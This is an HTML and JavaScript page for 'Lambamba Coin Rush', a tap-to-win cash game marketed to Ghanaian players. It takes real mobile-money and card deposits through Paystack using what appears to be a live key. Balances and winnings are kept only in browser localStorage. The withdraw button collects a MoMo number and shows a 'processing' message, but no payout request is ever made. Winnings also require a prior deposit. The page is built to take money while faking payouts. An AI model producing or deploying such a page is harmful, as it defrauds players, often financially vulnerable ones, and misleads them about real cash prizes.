<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Lambamba Coin Rush</title><script src="https://js.paystack.co/v1/inline.js"></script><style>body{margin:0;background:#0a5c26;color:white;font-family:sans-serif;text-align:center;padding:20px}h1{color:#ffdf00;font-size:32px}.box{background:white;color:#0a5c26;padding:20px;border-radius:20px;max-width:400px;margin:20px auto}button{background:#ffcc00;color:#000;border:0;padding:18px 30px;border-radius:50px;font-weight:bold;font-size:20px;width:100%;margin:10px 0}input{padding:15px;width:90%;border-radius:10px;border:2px solid #0a5c26;margin:10px 0;font-size:18px}#coin{font-size:100px;cursor:pointer;user-select:none;transition:.1s}#coin:active{transform:scale(.9)}.bal{font-size:24px;font-weight:bold}</style></head><body><h1>🐑 LAMBAMBA<br>COIN RUSH</h1><p>Ghana's Fastest Cash Game - Tap & Win Real GHS!</p><div class="box"><div class="bal">Balance: GHS <span id="bal">0.00</span></div><div id="coin" onclick="tap()">🪙</div><div>Coins: <span id="coins">0</span> / 200</div><div>Time: <span id="time">60</span>s</div><input id="amt" type="number" placeholder="Amount e.g. 20"><button onclick="deposit()">Deposit with MoMo (Paystack)</button><button onclick="startGame()" style="background:#0a5c26;color:white">START GAME - WIN GHS</button><button onclick="withdraw()" style="background:white;border:2px solid #0a5c26">Withdraw to MoMo</button><p style="font-size:12px">Min deposit 5 GHS • Win 150+ coins to cashout • Paystack secured</p></div><script>let c=0,t=60,iv=null,b=parseFloat(localStorage.getItem('lb_bal')||'0');let pk='pk_live_10cf2e08c5d1e4af4e6bf8fd5ddbb4e0b7cfd8b3';document.getElementById('bal').innerText=b.toFixed(2);function tap(){if(!iv)return;c++;document.getElementById('coins').innerText=c;if(c>=150&&b>0){b+=5;save();alert('You won +GHS 5!')}}function startGame(){c=0;t=60;document.getElementById('coins').innerText=0;document.getElementById('time').innerText=60;clearInterval(iv);iv=setInterval(()=>{t--;document.getElementById('time').innerText=t;if(t<=0){clearInterval(iv);iv=null;if(c>=150){b+=10;save();alert('CONGRATS! You won GHS 10! Balance: '+b)}else alert('Game Over! Got '+c+' coins. Need 150 to win')}} ,1000)}function save(){localStorage.setItem('lb_bal',b);document.getElementById('bal').innerText=b.toFixed(2)}function deposit(){let a=parseFloat(document.getElementById('amt').value);if(!a||a<5)return alert('Min 5 GHS');let h=PaystackPop.setup({key:pk,email:'player@lambamba.gh',amount:a*100,currency:'GHS',channels:['mobile_money','card'],callback:function(r){b+=a;save();alert('Deposit success! GHS '+a+' added')},onClose:function(){}});h.openIframe()}function withdraw(){if(b<20)return alert('Min withdraw 20 GHS');let m=prompt('Enter MoMo number:');if(!m)return;b-=20;save();alert('Withdraw request GHS 20 to '+m+' - Processing via Paystack transfer (manual approval)');}</script></body></html>